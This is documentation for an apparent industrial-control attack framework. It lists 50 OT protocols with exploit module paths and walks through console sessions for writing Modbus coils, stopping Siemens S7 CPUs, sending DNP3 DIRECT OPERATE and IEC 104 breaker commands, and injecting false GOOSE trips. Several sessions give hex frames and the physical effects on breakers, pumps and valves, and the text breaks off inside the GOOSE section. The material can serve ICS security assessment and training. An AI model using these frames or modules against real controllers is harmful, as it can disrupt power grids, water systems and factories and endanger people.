# Protocols & Vendors

IXF covers 50+ industrial protocols and 150+ OT/ICS vendors worldwide with scan, check, security assessment, and exploit modules. This document is the complete reference for protocol coverage, IXF module paths, and vendor coverage by region.

---

## `protocols` Command — Full Output

```
ixf > protocols

  IXF Protocol Coverage (50 protocols)
  ═══════════════════════════════════════════════════════════════════════════
  #   Protocol                  Port(s)          Type         Region/Usage
  ─────────────────────────────────────────────────────────────────────────
  01  Modbus TCP                502/TCP          App          Global — PLCs, SCADA
  02  Modbus RTU                Serial/gateway   App          Serial devices
  03  Siemens S7comm            102/TCP          App          Siemens S7-200/300/400
  04  Siemens S7comm+           102/TCP          App          Siemens S7-1200/1500 TLS
  05  EtherNet/IP (CIP)         44818/TCP+UDP    App          Rockwell, Omron
  06  PROFINET DCP              L2 Broadcast     L2           Siemens, Beckhoff, WAGO
  07  DNP3                      20000/TCP+UDP    App          Power, water, oil & gas
  08  BACnet/IP                 47808/UDP        App          Building automation
  09  BACnet/MSTP               Serial/gateway   App          Building serial networks
  10  IEC 60870-5-104           2404/TCP         App          Power grid RTUs
  11  IEC 61850 MMS             102/TCP          App          Substations, relays
  12  IEC 61850 GOOSE           L2 Multicast     L2           Protection relay interlocks
  13  OPC UA                    4840/TCP         App          Cross-platform IIoT
  14  OPC DA (DCOM)             135/TCP          App          Legacy Windows SCADA
  15  OPC HDA                   135/TCP          App          Historical data access
  16  OPC A&E                   135/TCP          App          Alarms & events
  17  Omron FINS                9600/UDP         App          Omron CS/CJ/NJ series
  18  Unitronics PCOM           20256/TCP        App          Vision/Unistream PLCs
  19  Beckhoff ADS/AMS          48898/TCP        App          TwinCAT runtime
  20  MQTT                      1883/TCP         App          IIoT messaging brokers
  21  SNMP                      161/UDP          App          Network management
  22  PROFIBUS DP               1962/TCP(gw)     App          Siemens, Beckhoff
  23  PROFIBUS PA               1962/TCP(gw)     App          Process instrumentation
  24  HART                      5094/TCP (HART-IP) App        Field instruments
  25  CANopen                   4001/TCP(gw)     App          Machine control
  26  CC-Link                   61450/UDP        App          Mitsubishi networks
  27  CC-Link IE Field          61450/UDP        App          Mitsubishi advanced
  28  EtherCAT                  L2               L2           Beckhoff, Omron
  29  EtherNet/POWERLINK        L2               L2           B&R, Keba
  30  SERCOS III                8008/TCP         App          CNC/robotics motion
  31  IO-Link                   Serial/gateway   App          Smart sensors/actuators
  32  INTERBUS                  1962/TCP(gw)     App          Phoenix Contact
  33  ControlNet                44818/TCP        App          Rockwell legacy
  34  DeviceNet                 44818/TCP        App          Rockwell CAN-based
  35  PCCC                      44818/TCP        App          Allen-Bradley SLC-500
  36  FL-NET (OPCN-2)           7000/UDP         App          Fuji Electric/JTEKT
  37  CompoNet                  9600/TCP(gw)     App          Omron
  38  Yokogawa Vnet/IP          20111/TCP        App          Yokogawa CENTUM DCS
  39  FOUNDATION Fieldbus H1    1089/TCP (HSE)   App          Emerson, ABB
  40  FOUNDATION Fieldbus HSE   1089/TCP         App          FF high-speed network
  41  LonWorks/LonTalk          1628/UDP         App          Building automation
  42  KNX/EIB                   3671/UDP         App          Building automation
  43  CIP Safety                44818/TCP        App          Rockwell GuardLogix
  44  PROFIsafe                 502 layer        App          PROFIBUS safety layer
  45  FSoE (Fail-Safe over EtherCAT) L2         L2           Beckhoff TwinSAFE
  46  SECS/GEM (HSMS)           5000/TCP         App          Semiconductor fabs
  47  Serial-to-Ethernet        4001/TCP         App          Moxa NPort, Lantronix
  48  SNMP OT                   161/UDP          App          OT device management
  49  DNP3 Security Auth (SAv5) 20000/TCP        App          SAv5 implementation
  50  OPC UA Security           4840/TCP         App          SecurityMode audit
  ═══════════════════════════════════════════════════════════════════════════
```

---

## Protocol Reference Table — All 50 Protocols

| # | Protocol | IEC/IEEE Standard | Default Port(s) | Protocol Type | Use in OT | IXF Module Paths | Example Use Case |
|---|----------|-------------------|-----------------|---------------|-----------|------------------|------------------|
| 1 | Modbus TCP | Modbus Specification | 502/TCP | Application | SCADA/PLC communication | `exploits/protocols/modbus/`, `scanners/ics/modbus_detect`, `scanners/ics/modbus_scanner` | Read/write registers on Schneider Modicon |
| 2 | Modbus RTU | Modbus Specification | Serial (RS-232/485) | Serial | Field devices via serial gateways | `exploits/protocols/modbus/modbus_client` | RTU device enumeration via Moxa gateway |
| 3 | Siemens S7comm | Siemens proprietary | 102/TCP (TSAP) | Application | Siemens S7-200/300/400 programming | `exploits/protocols/s7comm/` | S7-300 PLC stop command injection |
| 4 | Siemens S7comm+ | Siemens proprietary (TLS) | 102/TCP | Application | Siemens S7-1200/1500 (TLS-protected) | `exploits/protocols/s7comm_plus/`, `cve/siemens/cve_2021_22681*` | CVE-2021-22681 hardcoded key MitM |
| 5 | EtherNet/IP (CIP) | ODVA EIP Vol 1/2 | 44818/TCP, 2222/UDP | Application | Rockwell ControlLogix, Omron NJ | `exploits/protocols/enip/`, `scanners/ics/enip_scanner` | CIP tag enumeration on ControlLogix |
| 6 | PROFINET DCP | IEC 61158-5-10 | L2 Broadcast (0x8892) | L2 Ethernet | Siemens, Beckhoff, WAGO device discovery | `exploits/protocols/profinet/`, `scanners/ics/profinet_dcp_scanner` | DCP Identify flood causing device reset |
| 7 | DNP3 | IEEE 1815-2012 | 20000/TCP, 20000/UDP | Application | Power grid RTUs, water SCADA | `exploits/protocols/dnp3/`, `scanners/ics/dnp3_scanner`, `assessment/protocols/dnp3_security_audit` | Unauthorized DIRECT OPERATE to open breaker |
| 8 | BACnet/IP | ASHRAE 135-2020 | 47808/UDP | Application | HVAC, lighting, fire safety automation | `exploits/protocols/bacnet/`, `scanners/ics/bacnet_scanner` | BACnet Who-Is broadcast reconnaissance |
| 9 | BACnet/MSTP | ASHRAE 135-2020 | Serial/gateway | Serial | Building RS-485 field bus networks | `exploits/protocols/bacnet_mstp/` | MSTP token ring disruption via gateway |
| 10 | IEC 60870-5-104 | IEC 60870-5-104:2006 | 2404/TCP | Application | Power grid RTUs, substation control | `exploits/protocols/iec104/`, `scanners/ics/iec104_scanner` | ASDU EXEC command to trip circuit breaker |
| 11 | IEC 61850 MMS | IEC 61850-8-1 | 102/TCP (MMS over COTP) | Application | Substation automation, protection relays | `exploits/protocols/iec61850/`, `assessment/protocols/iec61850_security_audit` | Unauthenticated GOOSE trip command |
| 12 | IEC 61850 GOOSE | IEC 61850-8-1 GOOSE | L2 Multicast | L2 Ethernet | Protection relay fast-trip interlocks | `exploits/protocols/iec61850/goose_injection` | Forged GOOSE trip message causing false trip |
| 13 | OPC UA | IEC 62541 | 4840/TCP | Application | Cross-vendor industrial IoT, historian | `exploits/protocols/opcua/`, `scanners/ics/opcua_scanner`, `assessment/protocols/opcua_security_audit` | SecurityMode=None anonymous read/write |
| 14 | OPC DA (DCOM) | Microsoft DCOM/COM | 135/TCP (DCOM) | Application | Legacy Windows-based SCADA servers | `exploits/protocols/opc_da/` | DCOM enumeration, OPC server tag listing |
| 15 | OPC HDA | OPC Foundation | 135/TCP (DCOM) | Application | Historical process data access | `exploits/protocols/opc_hda/` | Unauthorized historian tag read |
| 16 | OPC A&E | OPC Foundation | 135/TCP (DCOM) | Application | Alarm and event subscriptions | `exploits/protocols/opc_ae/` | OPC A&E alarm suppression |
| 17 | Omron FINS | Omron proprietary | 9600/UDP, 9600/TCP | Application | Omron CS/CJ/NJ/NX PLCs | `exploits/protocols/fins/`, `scanners/ics/omron_fins_scanner` | FINS command to read memory area D0000 |
| 18 | Unitronics PCOM | Unitronics proprietary | 20256/TCP | Application | Vision and Unistream series PLCs | `exploits/protocols/pcom/`, `scanners/ics/pcom_scanner` | PCOM info frame leaks version and config |
| 19 | Beckhoff ADS/AMS | Beckhoff proprietary | 48898/TCP | Application | TwinCAT 2/3 runtime, CX modules | `exploits/protocols/ads/`, `scanners/ics/ads_scanner` | ADS read/write to TwinCAT runtime variables |
| 20 | MQTT | OASIS MQTT 3.1.1/5.0 | 1883/TCP, 8883/TLS | Application | IIoT sensor data, cloud gateways | `exploits/protocols/mqtt/`, `scanners/ics/mqtt_scanner` | Unauthenticated MQTT broker topic subscribe |
| 21 | SNMP | RFC 1157/3411 | 161/UDP | Application | Network device management | `exploits/protocols/snmp/`, `scanners/ics/snmp_ot_scanner` | SNMP community string bruteforce |
| 22 | PROFIBUS DP | IEC 61158-3-3 | 1962/TCP (via gateway) | Fieldbus | Siemens, Beckhoff field devices | `exploits/protocols/profibus/`, `scanners/ics/profibus_scanner` | PROFIBUS DP parameter read via Anybus gateway |
| 23 | PROFIBUS PA | IEC 61158-2 / PROFIBUS PA | 1962/TCP (gw) | Fieldbus | Process instrumentation (hazardous areas) | `exploits/protocols/profibus_pa/` | PA device IDENT block manipulation |
| 24 | HART | HART Communication Foundation | 5094/TCP (HART-IP) | Application | 4-20mA transmitters, smart field devices | `exploits/protocols/hart/`, `scanners/ics/hart_ip_scanner` | HART device configuration read via HART-IP |
| 25 | CANopen | CiA DS-301 | 4001/TCP (via gateway) | Fieldbus | Machine control, robotics | `exploits/protocols/canopen/`, `scanners/ics/canopen_scanner` | NMT command to stop CANopen slave |
| 26 | CC-Link | Mitsubishi proprietary | 61450/UDP | Fieldbus | Mitsubishi MELSEC networks | `exploits/protocols/cc_link/`, `scanners/ics/cc_link_scanner` | CC-Link cyclic scan disruption |
| 27 | CC-Link IE Field | Mitsubishi proprietary | 61450/UDP | Fieldbus | Mitsubishi high-speed Ethernet | `exploits/protocols/cc_link_ie_field/` | IE Field token disruption |
| 28 | EtherCAT | IEC 61158-12 | L2 Ethernet | L2 | High-speed motion control (Beckhoff, Omron) | `exploits/protocols/ethercat/` | EtherCAT broadcast storm disruption |
| 29 | EtherNet/POWERLINK | IEC 61158-10 | L2 Ethernet | L2 | B&R APROL, Keba systems | `exploits/protocols/powerlink/` | POWERLINK SoC frame injection |
| 30 | SERCOS III | IEC 61784-1 | 8008/TCP | Application | CNC and robotics motion networks | `exploits/protocols/sercos/` | SERCOS ring disruption |
| 31 | IO-Link | IEC 61131-9 | Serial / IO-Link master | Serial | Smart sensor/actuator interface | `exploits/protocols/iolink/` | IO-Link device parameter read/write |
| 32 | INTERBUS | IEC 61158-6-8 | 1962/TCP (gw) | Fieldbus | Phoenix Contact automation | `exploits/protocols/interbus/` | INTERBUS CMD parameter manipulation |
| 33 | ControlNet | ODVA ControlNet | 44818/TCP | Fieldbus | Rockwell legacy scheduled networks | `exploits/protocols/controlnet/` | ControlNet unscheduled message injection |
| 34 | DeviceNet | ODVA DeviceNet | 44818/TCP | Fieldbus | Rockwell CAN-based device network | `exploits/protocols/devicenet/` | DeviceNet UCMM request to read EDS |
| 35 | PCCC | Allen-Bradley proprietary | 44818/TCP | Application | Allen-Bradley SLC-500, PLC-5 | `exploits/protocols/pccc/` | PCCC typed logical read/write |
| 36 | FL-NET (OPCN-2) | JEMA FL-NET | 7000/UDP | Fieldbus | Fuji Electric, JTEKT (Japan factory) | `exploits/protocols/fl_net/`, `scanners/ics/fl_net_scanner` | FL-NET token arbitration disruption |
| 37 | CompoNet | Omron CompoNet | 9600/TCP (gw) | Fieldbus | Omron CompoNet sensor/actuator networks | `exploits/protocols/componet/` | CompoNet output bit forced ON |
| 38 | Yokogawa Vnet/IP | Yokogawa proprietary | 20111/TCP | Application | Yokogawa CENTUM VP DCS | `exploits/protocols/vnetip/`, `scanners/ics/vnetip_scanner` | Vnet/IP engineering function call |
| 39 | FOUNDATION Fieldbus H1 | IEC 61158-2 FF | 1089/TCP (HSE) | Fieldbus | Emerson DeltaV, ABB 800xA (hazardous areas) | `exploits/protocols/foundation_fieldbus/` | FF H1 function block parameter write |
| 40 | FOUNDATION Fieldbus HSE | IEC 61158 FF-HSE | 1089/TCP | Application | FF high-speed Ethernet backbone | `exploits/protocols/foundation_fieldbus/` | HSE subnet device enumeration |
| 41 | LonWorks/LonTalk | ANSI/CEA-709 | 1628/UDP | Application | Building automation, street lighting | `exploits/protocols/lonworks/`, `scanners/ics/lonworks_scanner` | LonWorks device wink command broadcast |
| 42 | KNX/EIB | EN 50090 / ISO 22510 | 3671/UDP (KNXnet/IP) | Application | European building automation (lighting, HVAC) | `exploits/protocols/knx/`, `scanners/ics/knx_scanner` | KNX group write to toggle lighting |
| 43 | CIP Safety | ODVA CIP Safety | 44818/TCP | Application | Rockwell GuardLogix safety PLCs | `exploits/protocols/ethernet_ip_cip_safety/` | CIP Safety OUNID spoofing attempt |
| 44 | PROFIsafe | IEC 61800-5-2 | PROFIBUS/PROFINET layer | Application | Siemens PROFIBUS/PROFINET safety | `exploits/protocols/profisafe/` | PROFIsafe CRC bypass probe |
| 45 | FSoE | IEC 61784-3-12 | EtherCAT L2 | L2 | Beckhoff TwinSAFE safety modules | `exploits/protocols/fsoe/` | FSoE watchdog suppression |
| 46 | SECS/GEM (HSMS) | SEMI E5/E30/E37 | 5000/TCP | Application | Semiconductor fab equipment interfaces | `exploits/protocols/hsms/`, `scanners/ics/hsms_scanner` | HSMS S1F1 host/equipment info request |
| 47 | Serial-to-Ethernet | N/A (device-specific) | 4001/TCP | Application | Moxa NPort, Lantronix serial tunneling | `exploits/protocols/serial/`, `scanners/ics/serial_to_ethernet_scanner` | Unauthenticated web console on Moxa NPort |
| 48 | SNMP OT | RFC 1157 + MIB-II | 161/UDP | Application | OT device management, switch enumeration | `exploits/protocols/snmp/`, `scanners/ics/snmp_ot_scanner` | Public community string read of OT MIBs |
| 49 | DNP3 Secure Auth v5 | IEEE 1815-2012 SAv5 | 20000/TCP | Application | DNP3 SAv5 challenge-response verification | `assessment/protocols/dnp3_security_audit` | SAv5 enabled/disabled detection |
| 50 | OPC UA Security | IEC 62541-7 | 4840/TCP | Application | OPC UA certificate and auth audit | `assessment/protocols/opcua_security_audit` | SecurityMode=None detection, anon browse test |

---

## Top 20 Protocol Detailed Reference

### 1. Modbus TCP

**Description:** Modbus is the most widely deployed industrial communication protocol globally. Originally developed by Modicon in 1979 for serial communication over RS-232, Modbus TCP wraps the Modbus Application Protocol (MBAP) over standard TCP/IP. It is completely unauthenticated by design — any host on the network can read or write coils, registers, and discrete inputs.

**History:** The protocol predates OT cybersecurity concerns by decades. There is no authentication, encryption, or integrity protection in the base specification. Extensions such as Modbus Security (RFC 8605) exist but are rarely deployed.

**Security Issues:**
- No authentication — any client can read/write any register
- No encryption — all data transmitted in plaintext
- No integrity protection — replay and injection attacks are trivial
- Function code 8 (Diagnostics) can restart devices
- FC43 (MEI) leaks device identification (vendor, product, firmware)

**IXF Modules:**

| Module | Purpose |
|--------|---------|
| `scanners/ics/modbus_detect` | Detect Modbus TCP devices (FC4 probe) |
| `scanners/ics/modbus_scanner` | Scan CIDR range for Modbus devices |
| `exploits/protocols/modbus/modbus_client` | Full Modbus client (read/write any FC) |
| `exploits/protocols/modbus/modbus_unauthorized_coil_set` | Write arbitrary coil values |
| `exploits/protocols/modbus/modbus_write_coil_flood` | Rapid coil write flood |
| `exploits/protocols/modbus/modbus_replay_attack` | Replay captured Modbus frames |

**Example Usage:**

```
ixf > use exploits/protocols/modbus/modbus_unauthorized_coil_set
[*] Module loaded: Modbus TCP Unauthorized Coil Set
[*] CVE: N/A | CVSS: N/A | Impact: HIGH

ixf (Modbus TCP Unauthorized Coil Set) > show options

  +──────────────────+──────────+──────────+────────────────────────────────────────────+
  | Option           | Value    | Required | Description                                |
  +──────────────────+──────────+──────────+────────────────────────────────────────────+
  | target           |          | yes      | Target IP or hostname                      |
  | port             | 502      | no       | Modbus TCP port                            |
  | unit_id          | 1        | no       | Modbus unit/slave ID (1-247)               |
  | coil_addr        | 0        | no       | Starting coil address (0-based)            |
  | coil_value       | 1        | no       | Coil value to write (0=OFF, 1=ON)          |
  | count            | 1        | no       | Number of coils to write                   |
  | timeout          | 5        | no       | Connection timeout                         |
  | simulate         | True     | no       | Simulate mode                              |
  | destructive      | False    | no       | Enable live coil write                     |
  +──────────────────+──────────+──────────+────────────────────────────────────────────+

ixf (Modbus TCP Unauthorized Coil Set) > set target 192.168.1.100
[*] target => 192.168.1.100

ixf (Modbus TCP Unauthorized Coil Set) > set coil_addr 0
[*] coil_addr => 0

ixf (Modbus TCP Unauthorized Coil Set) > set coil_value 1
[*] coil_value => 1

ixf (Modbus TCP Unauthorized Coil Set) > run

  [SIMULATE MODE — no packets sent]
  ═══════════════════════════════════════════════════════════════════════════
  Module:  Modbus TCP Unauthorized Coil Set
  Target:  192.168.1.100:502  Unit ID: 1

  Step 1: Connect TCP to 192.168.1.100:502
  Step 2: Send Write Single Coil (FC05) request:
          MBAP: 00 01 00 00 00 06 01
          PDU:  05 00 00 FF 00          (coil addr=0, value=0xFF00=ON)
          Full frame (hex): 00 01 00 00 00 06 01 05 00 00 FF 00
  Step 3: Verify echo response (FC05 echo)
  Step 4: Coil 0 at unit 1 set to ON

  [i] Physical consequence: Digital output DO0 driven HIGH
      Depending on the wired device, this may activate a relay, valve, motor, or alarm.
  [i] MITRE ATT&CK for ICS: T0855 (Unauthorized Command Message)
  [i] To run live: set simulate false + set destructive true

ixf (Modbus TCP Unauthorized Coil Set) > check
[*] Checking 192.168.1.100:502...
[+] REACHABLE — TCP 502 open
[+] MODBUS DEVICE DETECTED — FC4 response received, Transaction ID echoed
[+] Unit ID 1 responded. FC4 Input Register[0] = 0x0043
```

---

### 2. Siemens S7comm

**Description:** S7comm is Siemens' proprietary protocol for communication between TIA Portal, STEP 7, and S7-200/300/400/1500 PLCs over ISO-on-TCP (port 102). The protocol uses TPKT and COTP transport layers. S7comm (the original variant for S7-300/400) has no authentication or encryption. S7comm+ (for S7-1200/1500) adds TLS but uses a hardcoded global private key (CVE-2021-22681).

**Security Issues:**
- S7comm: no authentication, no encryption, full read/write access
- S7comm+: TLS with hardcoded key — decryptable by any attacker (CVE-2021-22681)
- CPU START/STOP commands require no credentials
- Program upload/download unauthenticated on older firmware
- FC43 (MEI equivalent) leaks firmware version and hardware info

**IXF Modules:**

| Module | Purpose |
|--------|---------|
| `scanners/ics/s7_comm_scanner` | Detect S7 PLCs (COTP/S7 probe) |
| `exploits/protocols/s7comm/s7_cpu_stop` | Send S7 CPU STOP command |
| `exploits/protocols/s7comm/s7_program_download` | Write modified PLC program |
| `exploits/protocols/s7comm/s7_read_memory` | Read PLC data areas (DB, MB, QB) |
| `exploits/protocols/s7comm_plus/s7plus_mitm` | MitM exploit using CVE-2021-22681 key |
| `cve/siemens/cve_2021_22681_s7_1200_hardcoded_key` | Full CVE-2021-22681 exploit |

**Example Usage:**

```
ixf > use exploits/protocols/s7comm/s7_cpu_stop
[*] Module loaded: Siemens S7comm CPU Stop Command
[*] CVE: N/A | CVSS: N/A | Impact: HIGH

ixf (Siemens S7comm CPU Stop Command) > show options

  +──────────────────+──────────+──────────+────────────────────────────────────────────+
  | Option           | Value    | Required | Description                                |
  +──────────────────+──────────+──────────+────────────────────────────────────────────+
  | target           |          | yes      | Target S7 PLC IP                           |
  | port             | 102      | no       | S7comm TCP port (TSAP)                     |
  | rack             | 0        | no       | PLC rack number                            |
  | slot             | 1        | no       | PLC slot number (1=S7-300, 2=S7-1200/1500) |
  | simulate         | True     | no       | Simulate mode                              |
  | destructive      | False    | no       | Enable live CPU STOP                       |
  +──────────────────+──────────+──────────+────────────────────────────────────────────+

ixf (Siemens S7comm CPU Stop Command) > set target 192.168.1.55
[*] target => 192.168.1.55

ixf (Siemens S7comm CPU Stop Command) > run

  [SIMULATE MODE — no packets sent]
  ═══════════════════════════════════════════════════════════════════════════
  Module:  Siemens S7comm CPU Stop Command
  Target:  192.168.1.55:102  Rack: 0  Slot: 1

  Step 1: Establish ISO-on-TCP connection (TPKT + COTP CR)
  Step 2: Send S7comm Setup Communication PDU (negotiation)
  Step 3: Send S7comm CPU Control — STOP command:
          TPKT: 03 00 00 21
          COTP: 02 F0 80
          S7: 32 01 00 00 00 00 00 10 00 00 28 00 00 00 00 00
              00 FD 00 00 09 50 5F 50 52 4F 47 52 41 4D
  Step 4: S7 CPU transitions to STOP state; RUN LED turns RED
  Step 5: All controlled outputs go to safe-state (configurable)

  [i] Physical consequence: PLC program execution halts immediately.
      All digital outputs de-energize or hold last value depending on OB86 config.
      Process controlled by this PLC stops.
  [i] MITRE ATT&CK for ICS: T0881 (Service Stop), T0803 (Block Control Command)
  [i] To run live: set simulate false + set destructive true
```

---

### 3. EtherNet/IP (CIP)

**Description:** EtherNet/IP (Ethernet Industrial Protocol) carries the Common Industrial Protocol (CIP) over standard TCP/UDP. It is the dominant protocol in North American manufacturing, used by Rockwell Allen-Bradley ControlLogix, CompactLogix, and GuardLogix. EtherNet/IP uses port 44818 (TCP for explicit messages, UDP for implicit I/O). CIP allows tag enumeration, read/write of PLC tags by name, and firmware downloads.

**Security Issues:**
- CIP does not require authentication for tag reads/writes in basic mode
- The Identity Object (Class 0x01) is always readable — leaks model, vendor, firmware
- Unregistered sessions can still enumerate tags in some firmware versions
- Forward Open requests can establish implicit I/O connections without auth
- CIP Safety (GuardLogix) has OUNID spoofing risks

**Example Usage:**

```
ixf > use scanners/ics/enip_scanner
[*] Module loaded: EtherNet/IP CIP Scanner

ixf (EtherNet/IP CIP Scanner) > show options

  +──────────────────+──────────+──────────+────────────────────────────────────────────+
  | Option           | Value    | Required | Description                                |
  +──────────────────+──────────+──────────+────────────────────────────────────────────+
  | target           |          | yes      | Target IP or CIDR range                    |
  | port             | 44818    | no       | EtherNet/IP TCP port                       |
  | udp_broadcast    | True     | no       | Use UDP broadcast for discovery            |
  | timeout          | 5        | no       | Connection timeout                         |
  | simulate         | True     | no       | Simulate mode                              |
  +──────────────────+──────────+──────────+────────────────────────────────────────────+

ixf (EtherNet/IP CIP Scanner) > set target 192.168.1.0/24
[*] target => 192.168.1.0/24

ixf (EtherNet/IP CIP Scanner) > run

  [SIMULATE MODE — no packets sent]
  Module:  EtherNet/IP CIP Scanner
  Target:  192.168.1.0/24

  Step 1: Send EtherNet/IP List Identity request (UDP port 44818 broadcast)
  Step 2: Collect List Identity responses:
          - Vendor ID (0x01 = Rockwell Automation)
          - Product Type (0x0E = Programmable Controller)
          - Product Code, Revision, Serial Number
          - Product Name (e.g., "1756-L85E/A ControlLogix5585E")
  Step 3: For each responding device, enumerate CIP Class 1 (Identity Object)
  Step 4: Report vendor, product, firmware revision for each host

  [i] MITRE ATT&CK for ICS: T0888 (Remote System Information Discovery)
```

---

### 4. DNP3

**Description:** DNP3 (Distributed Network Protocol 3) is widely used in electric utilities (power grid RTUs, substations) and water/wastewater SCADA systems. Defined in IEEE 1815-2012. DNP3 has a DIRECT OPERATE (DO) function that can directly control field devices — breakers, valves, pumps — without a handshake. DNP3 Secure Authentication version 5 (SAv5) was added in 2012 but deployment remains limited.

**Security Issues:**
- DIRECT OPERATE commands require no authentication in base DNP3
- SELECT BEFORE OPERATE can be replayed without SAv5
- No encryption — all SCADA data (setpoints, alarms, events) in plaintext
- SAv5 implementation varies widely; many RTUs claim SAv5 support but have gaps
- Sequence number rollover can enable replay attacks

**Example Usage:**

```
ixf > use exploits/protocols/dnp3/dnp3_direct_operate
[*] Module loaded: DNP3 DIRECT OPERATE Binary Output
[*] CVE: N/A | CVSS: N/A | Impact: CRITICAL

ixf (DNP3 DIRECT OPERATE Binary Output) > show options

  +──────────────────+──────────────+──────────+──────────────────────────────────────────+
  | Option           | Value        | Required | Description                              |
  +──────────────────+──────────────+──────────+──────────────────────────────────────────+
  | target           |              | yes      | Target DNP3 outstation IP                |
  | port             | 20000        | no       | DNP3 TCP port (default: 20000)           |
  | master_addr      | 1            | no       | DNP3 master address                      |
  | outstation_addr  | 10           | no       | DNP3 outstation address                  |
  | obj_group        | 12           | no       | CROB group (12=Binary Output Cmd Block)  |
  | obj_var          | 1            | no       | CROB variation                           |
  | point_index      | 0            | no       | Binary output point index                |
  | trip_close       | LATCH_ON     | no       | Operation type: LATCH_ON/LATCH_OFF/PULSE |
  | simulate         | True         | no       | Simulate mode                            |
  | destructive      | False        | no       | Enable live command                      |
  +──────────────────+──────────────+──────────+──────────────────────────────────────────+

ixf (DNP3 DIRECT OPERATE Binary Output) > set target 10.0.0.101
[*] target => 10.0.0.101

ixf (DNP3 DIRECT OPERATE Binary Output) > set outstation_addr 10
[*] outstation_addr => 10

ixf (DNP3 DIRECT OPERATE Binary Output) > run

  [SIMULATE MODE — no packets sent]
  Module:  DNP3 DIRECT OPERATE Binary Output
  Target:  10.0.0.101:20000
  Master:  1  Outstation: 10  Point: 0  Op: LATCH_ON

  Step 1: Connect TCP to 10.0.0.101:20000
  Step 2: Build DNP3 Application Layer DIRECT OPERATE:
          Link Frame: 05 64 XX XX 0A 00 01 00
          App Header: C0 03 (Confirm=1, FC=03 DIRECT_OPERATE)
          Obj Header: 0C 01 28 01 00 00 00
          CROB:       03 01 00 00 00 00 01 00 00 00 00 00
                      (LATCH_ON, count=1, on_time=100ms, off_time=100ms)
  Step 3: Send to outstation
  Step 4: Binary output point 0 activates (relay closes, circuit energizes)

  [i] Physical consequence: Binary output 0 drives HIGH.
      In power grid: trips or closes a circuit breaker.
      In water: activates a pump or opens a valve.
  [i] MITRE ATT&CK for ICS: T0855 (Unauthorized Command Message)
  [i] MITRE ATT&CK for ICS: T0803 (Block Control Command)
```

---

### 5. BACnet/IP

**Description:** BACnet (Building Automation and Control network) is the dominant protocol in building automation: HVAC, lighting, fire safety, access control, and energy management. BACnet/IP runs over UDP port 47808. The Who-Is/I-Am service is a broadcast service for device discovery. BACnet has no authentication in the base standard. BACnet/SC (Secure Connect) adds TLS but adoption is recent.

**Example Usage:**

```
ixf > use scanners/ics/bacnet_scanner
[*] Module loaded: BACnet/IP Device Scanner

ixf (BACnet/IP Device Scanner) > set target 192.168.1.0/24
[*] target => 192.168.1.0/24

ixf (BACnet/IP Device Scanner) > run

  [SIMULATE MODE — no packets sent]
  Module:  BACnet/IP Device Scanner
  Target:  192.168.1.0/24

  Step 1: Send BACnet/IP Who-Is broadcast (UDP 47808)
          BVLC Header: 81 0B 00 0C
          NPDU: 01 20 FF FF 00 FF
          APDU: 10 08 (Unconfirmed Who-Is, all devices)
  Step 2: Collect I-Am responses:
          - Device Instance ID
          - Max APDU length
          - Segmentation support
          - Vendor ID
  Step 3: For each device, send ReadProperty to Device Object:
          - Object Name (device name / building zone)
          - Vendor Name
          - Model Name
          - Application Software Version
          - Protocol Version
  Step 4: Build device inventory report

  [i] MITRE ATT&CK for ICS: T0888 (Remote System Information Discovery)
  [i] BACnet devices found on typical building networks: thermostats, AHUs,
      lighting controllers, fire panels, elevators, energy meters
```

---

### 6. IEC 60870-5-104

**Description:** IEC 104 (IEC 60870-5-104) is the TCP/IP variant of IEC 60870-5-101, used for power grid SCADA: control centers communicating with remote terminal units (RTUs) in substations and distribution networks. The protocol carries ASDU (Application Service Data Units) that can send control commands (ASDU type 45/46/47/48 — single/double point commands, step commands) to field devices.

**Example Usage:**

```
ixf > use exploits/protocols/iec104/iec104_command_injection
[*] Module loaded: IEC 60870-5-104 ASDU Command Injection
[*] CVE: N/A | CVSS: N/A | Impact: CRITICAL

ixf (IEC 60870-5-104 ASDU Command Injection) > set target 10.10.0.20
[*] target => 10.10.0.20

ixf (IEC 60870-5-104 ASDU Command Injection) > run

  [SIMULATE MODE — no packets sent]
  Module:  IEC 60870-5-104 ASDU Command Injection
  Target:  10.10.0.20:2404

  Step 1: Establish TCP connection to 10.10.0.20:2404
  Step 2: Send STARTDT (Start Data Transfer) U-frame
          Frame: 68 04 07 00 00 00
  Step 3: Wait for STARTDT_CON acknowledgment
  Step 4: Send I-frame with ASDU type 46 (Double Point Command):
          APCI: 68 13 [Send Sequence Number] [Recv Seq Number]
          ASDU: 2E 01 07 00 01 00 02 00 03
                TypeID=0x2E (46), SQ=0, COT=6 (Activation),
                CA=1, IOA=3 (Object Address 3), DCS=02 (ON)
  Step 5: RTU executes command: double-point output 3 set to ON

  [i] Physical: Open/close breaker, trip protection relay, activate SCADA actuator
  [i] MITRE ATT&CK for ICS: T0855 (Unauthorized Command Message)
```

---

### 7. IEC 61850 / GOOSE

**Description:** IEC 61850 is the standard for substation communication and automation. It covers MMS (Manufacturing Message Specification) over TCP/102 for SCADA-to-IED communication, and GOOSE (Generic Object Oriented Substation Event) for peer-to-peer L2 multicast between protection relays. GOOSE is used for fast protection interlocking (under 4ms). GOOSE has no authentication by default — any attacker on the substation LAN can inject false GOOSE trip messages. IEC 62351-6 adds HMAC-SHA256 authentication to GOOSE.

**Example Usage:**

```
ixf > use exploits/protocols/iec61850/goose_injection
[*] Module loaded: IEC 61850 GOOSE False Trip Injection
[*] CVE: N/A | CVSS: N/A | Impact: CRITICAL

ixf (IEC 61850 GOOSE False Trip Injection) > show options

  +──────────────────+───────────────────────+──────────+──────────────────────────────+
  | Option           | Value                 | Required | Description                  |
  +──────────────────+───────────────────────+──────────+──────────────────────────────+
  | interface        | eth0                  | yes      | Network interface (L2)       |
  | src_mac          | de:ad:be:ef:00:01     | no       | Source MAC (spoofed relay)   |
  | dst_mac          | 01:0c:cd:01:00:01     | no       | GOOSE multicast destination  |
  | appid            | 0x0001                | no       | Application ID               |
  | gocb_ref         | IED1LD0/LLN0$GO$GCB1 | no       | GOOSE Control Block Ref      |
  | dataset          | IED1LD0/LLN0$DS1      | no       | Dataset reference            |
  | stNum            | 1                     | no       | Status number                |
  | sqNum            | 0                     | no       | Sequence number              |
  | trip_value       | True                  | no       | Trip value (True=TRIP)       |
  | simulate         | True                  | no       | Simulate mode                |
  | destructive      | False                 | no       | Enable live L2 injection     |
  +──────────────────+───────────────────────+──────────+──────────────────────────────+

ixf (IEC 61850 GOOSE False Trip Injection) > run

  [SIMULATE MODE — no packets sent]
  Module:  IEC 61850 GOOSE False Trip Injection
  Interface: eth0

  Step 1: Craft GOOSE PDU:
          EtherType: 0x88B8 (GOOSE)
